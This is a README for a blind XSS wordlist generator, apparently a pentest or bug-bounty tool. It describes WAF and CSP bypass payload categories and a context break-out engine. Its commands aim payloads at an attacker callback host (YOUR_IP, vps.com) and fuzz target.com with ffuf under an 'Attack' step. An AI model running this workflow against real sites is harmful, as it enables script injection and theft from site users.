## Blind XSS Wordlist Generator

A specialized Python tool for generating **Blind XSS** payloads featuring a powerful **Context Break-Out Engine**.

🚀 **Web Version Available:** [cyber-utils.vercel.app](https://cyber-utils.vercel.app/)

---

### Key Features

* **100+ Base Payloads**: Categorized by type (WAF Bypass, CSP Bypass, Polyglots, AngularJS, DOM, etc.).
* **Context Break-Out Engine**: Automatically wraps payloads with sequences designed to escape HTML tags, JavaScript strings, attributes, or JSON structures.
* **Instant Diagnosis (PIDs)**: Each payload uses a unique ID (e.g., `BAS-001_attr_double-quote`). When your listener receives a hit, you immediately know which specific context was successfully exploited.

---

### Quick Start

#### 1. Basic Generation

Generate a standard list pointing to your listener:

```bash
python3 xss_gen.py --ip http://YOUR_IP

```

#### 2. Full Break-Out Mode (Recommended)

Generate thousands of variants to test every possible injection scenario:

```bash
python3 xss_gen.py --ip http://YOUR_IP --wrap --contexts all

```

#### 3. List Options

View all available categories and contexts:

```bash
python3 xss_gen.py --list

```

---

### Main Arguments

| Argument | Description |
| --- | --- |
| `--ip` | Your callback URL/IP (e.g., `http://1.2.3.4`). |
| `--wrap` | Enable the context break-out engine. |
| `--contexts` | Target specific contexts (`html`, `js`, `attr`, `url`, `json`, `css`). |
| `--categories` | Select payload types (`waf`, `csp`, `polyglot`, `angular`, etc.). |

---

### Workflow Example

1. **Generate**: `python3 xss_gen.py --ip http://vps.com --wrap -o wordlist.txt`
2. **Attack**: `ffuf -u https://target.com/api?id=FUZZ -w wordlist.txt`
3. **Analyze**: A hit on `/BAS-001_js_single-quote` means you found an XSS vulnerability inside a **single-quoted JavaScript string**.
